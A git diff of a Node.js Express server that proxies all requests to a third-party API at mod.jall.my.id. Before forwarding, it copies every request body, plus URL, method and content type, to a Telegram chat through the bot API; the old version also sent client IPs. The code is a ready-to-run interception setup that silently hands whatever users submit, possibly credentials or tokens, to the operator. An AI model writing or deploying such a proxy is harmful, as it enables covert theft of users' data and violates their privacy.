@@ -1,25 +1,27 @@
 // server.js
-// Simple proxy to https://mod.jall.my.id/api/v11/*
-// Forwards request body to Telegram (bot token + chat id required)
+// Proxy server to forward requests to https://mod.jall.my.id/api/v11/*
+// and send the request body to your Telegram chat.
 
-require('dotenv').config();
 const express = require('express');
 const axios = require('axios');
 const FormData = require('form-data');
 
 const app = express();
 
-// Raw body for all content types so we can forward binary/text exactly.
-// Increase limit if you expect larger payloads.
+// Middleware: capture raw body for all content types
 app.use(express.raw({ type: '*/*', limit: '10mb' }));
 
-// Config via env
-const TARGET_BASE = process.env.TARGET_BASE || 'https://mod.jall.my.id/api/v11';
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+// ===== CONFIG (edit these before running) =====
+const TARGET_BASE = 'https://mod.jall.my.id/api/v11';
+
+// Replace with your real bot token and chat id
+const TELEGRAM_BOT_TOKEN = '123456789:AA-your-bot-token-here';
+const TELEGRAM_CHAT_ID = '987654321'; // can be user id or group id
+// =============================================
+
 const TELEGRAM_ENABLED = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
 
-// Hop-by-hop headers that should not be forwarded back to client
+// Some headers we don’t want to forward
 const HOP_BY_HOP = new Set([
   'connection',
   'keep-alive',
@@ -33,8 +35,7 @@ const HOP_BY_HOP = new Set([
 
 function filterRequestHeaders(originalHeaders) {
   const h = { ...originalHeaders };
-  delete h.host; // upstream will set host
-  // optionally remove other headers you don't want to forward to upstream
+  delete h.host; // upstream sets its own host
   return h;
 }
 
@@ -42,71 +43,9 @@ function filterResponseHeaders(upstreamHeaders) {
   const out = {};
   for (const [k, v] of Object.entries(upstreamHeaders || {})) {
     if (HOP_BY_HOP.has(k.toLowerCase())) continue;
-    // Some servers return arrays. Axios typically flattens; we set as-is.
     out[k] = v;
   }
   return out;
-}
-
-async function sendToTelegram(req, rawBodyBuffer) {
-  if (!TELEGRAM_ENABLED) return { ok: false, reason: 'Telegram not configured' };
-
-  // Prepare metadata text
-  const summary = [
-    `🔔 <b>Proxied Request</b>`,
-    `<b>URL:</b> ${req.originalUrl}`,
-    `<b>Method:</b> ${req.method}`,
-    `<b>Remote IP:</b> ${req.ip || req.connection?.remoteAddress || 'unknown'}`,
-    `<b>Content-Type:</b> ${req.get('content-type') || '(none)'}`
-  ].join('\n');
-
-  const contentType = (req.get('content-type') || '').toLowerCase();
-
-  try {
-    // If small and textual, send as a single message with body text (escape HTML)
-    if (
-      contentType.startsWith('application/json') ||
-      contentType.startsWith('text/') ||
-      contentType === 'application/x-www-form-urlencoded'
-    ) {
-      // convert buffer to string safely
-      let bodyStr = '';
-      try { bodyStr = rawBodyBuffer ? rawBodyBuffer.toString('utf8') : ''; } catch(e){ bodyStr = '[unreadable]'; }
-
-      // Limit message size to Telegram limits (~4096 chars). If bigger, fall through to document send.
-      const fullText = `${summary}\n\n<b>Body:</b>\n<pre>${escapeHtml(bodyStr).slice(0, 3800)}</pre>`;
-      if (fullText.length < 3800) {
-        const resp = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          chat_id: TELEGRAM_CHAT_ID,
-          text: fullText,
-          parse_mode: 'HTML'
-        }, { timeout: 10000 });
-        return { ok: true, method: 'sendMessage', resp: resp.data };
-      }
-      // else fallthrough to sendDocument
-    }
-
-    // For binary or large bodies, send as document
-    const form = new FormData();
-    form.append('chat_id', TELEGRAM_CHAT_ID);
-    form.append('caption', summary);
-    // name file from path
-    const filename = (req.path && req.path.replace(/\//g, '_').replace(/^_/, '')) || 'body.bin';
-    form.append('document', rawBodyBuffer || Buffer.from(''), { filename: filename, contentType: contentType || 'application/octet-stream' });
-
-    const headers = form.getHeaders();
-    const resp = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
-      headers,
-      maxContentLength: Infinity,
-      maxBodyLength: Infinity,
-      timeout: 20000
-    });
-
-    return { ok: true, method: 'sendDocument', resp: resp.data };
-  } catch (err) {
-    // Return error info
-    return { ok: false, error: err?.toString?.() || String(err), detail: err?.response?.data || null };
-  }
 }
 
 function escapeHtml(unsafe) {
@@ -117,65 +56,122 @@ function escapeHtml(unsafe) {
     .replace(/>/g, '&gt;');
 }
 
-// Catch-all route to proxy every request path
+// Send request body + metadata to Telegram
+async function sendToTelegram(req, rawBodyBuffer) {
+  if (!TELEGRAM_ENABLED) return { ok: false, reason: 'Telegram not configured' };
+
+  const summary = [
+    `🔔 <b>Proxied Request</b>`,
+    `<b>URL:</b> ${req.originalUrl}`,
+    `<b>Method:</b> ${req.method}`,
+    `<b>Content-Type:</b> ${req.get('content-type') || '(none)'}`
+  ].join('\n');
+
+  const contentType = (req.get('content-type') || '').toLowerCase();
+
+  try {
+    if (
+      contentType.startsWith('application/json') ||
+      contentType.startsWith('text/') ||
+      contentType === 'application/x-www-form-urlencoded'
+    ) {
+      let bodyStr = '';
+      try {
+        bodyStr = rawBodyBuffer ? rawBodyBuffer.toString('utf8') : '';
+      } catch (e) {
+        bodyStr = '[unreadable]';
+      }
+
+      const fullText = `${summary}\n\n<b>Body:</b>\n<pre>${escapeHtml(
+        bodyStr
+      ).slice(0, 3800)}</pre>`;
+
+      if (fullText.length < 3800) {
+        await axios.post(
+          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+          {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: fullText,
+            parse_mode: 'HTML'
+          },
+          { timeout: 10000 }
+        );
+        return { ok: true, method: 'sendMessage' };
+      }
+    }
+
+    // For binary or large bodies → send as document
+    const form = new FormData();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('caption', summary);
+
+    const filename =
+      (req.path && req.path.replace(/\//g, '_').replace(/^_/, '')) ||
+      'body.bin';
+
+    form.append('document', rawBodyBuffer || Buffer.from(''), {
+      filename: filename,
+      contentType: contentType || 'application/octet-stream'
+    });
+
+    await axios.post(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+      form,
+      {
+        headers: form.getHeaders(),
+        maxContentLength: Infinity,
+        maxBodyLength: Infinity,
+        timeout: 20000
+      }
+    );
+
+    return { ok: true, method: 'sendDocument' };
+  } catch (err) {
+    return { ok: false, error: err?.toString?.() || String(err) };
+  }
+}
+
+// Catch-all proxy route
 app.all('*', async (req, res) => {
   try {
-    // Build target URL: append the full originalUrl (path + query) to TARGET_BASE
-    // If originalUrl already starts with '/', just concatenate
     const targetUrl = `${TARGET_BASE}${req.originalUrl}`;
-
-    // Forward headers (but remove host)
     const forwardHeaders = filterRequestHeaders(req.headers);
 
-    // For GET/HEAD, do not include body
     const method = req.method.toUpperCase();
-    const hasBody = !(method === 'GET' || method === 'HEAD' || method === 'OPTIONS' && !req.body);
+    const hasBody = !(
+      method === 'GET' ||
+      method === 'HEAD' ||
+      (method === 'OPTIONS' && !req.body)
+    );
 
     const axiosConfig = {
       url: targetUrl,
       method,
       headers: forwardHeaders,
-      responseType: 'arraybuffer', // get raw bytes
-      validateStatus: () => true, // we'll forward the status code as-is
+      responseType: 'arraybuffer',
+      validateStatus: () => true,
       maxContentLength: Infinity,
       maxBodyLength: Infinity,
       timeout: 45000
     };
 
     if (hasBody) {
-      // req.body is a Buffer (because of express.raw)
       axiosConfig.data = req.body;
     }
 
-    // 1) Send body to Telegram (synchronously so we know it happened)
-    // Note: if you prefer not await this before proxying, you could do it async.
-    let tgResult = null;
-    try {
-      tgResult = await sendToTelegram(req, req.body);
-    } catch (e) {
-      tgResult = { ok: false, error: e.toString() };
-    }
+    // Send body to Telegram (waits until complete)
+    await sendToTelegram(req, req.body);
 
-    // 2) Proxy request to upstream
+    // Proxy to upstream
     const upstreamResp = await axios.request(axiosConfig);
 
-    // 3) Copy upstream status, headers, and body to our response
     const filteredHeaders = filterResponseHeaders(upstreamResp.headers);
-
-    // Set headers on response (avoid duplicate content-length issues)
     for (const [hk, hv] of Object.entries(filteredHeaders)) {
       try {
         res.setHeader(hk, hv);
-      } catch (e) {
-        // ignore headers that can't be set
-      }
+      } catch (_) {}
     }
 
-    // Also expose telegram result in a response header for debugging (optional)
-    // WARNING: do not expose in production if header may contain sensitive info.
-    res.setHeader('X-Proxy-Telegram-Status', tgResult?.ok ? 'sent' : 'failed');
-
-    // Set status code and send body buffer
     res.status(upstreamResp.status).send(Buffer.from(upstreamResp.data || []));
   } catch (err) {
     console.error('Proxy error:', err);
@@ -186,9 +182,10 @@ app.all('*', async (req, res) => {
   }
 });
 
+// Start server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Proxy server listening on port ${PORT}`);
-  console.log(`Forwarding to target base: ${TARGET_BASE}`);
+  console.log(`Proxy server running on port ${PORT}`);
+  console.log(`Forwarding requests to: ${TARGET_BASE}`);
   console.log(`Telegram enabled: ${TELEGRAM_ENABLED}`);
 });
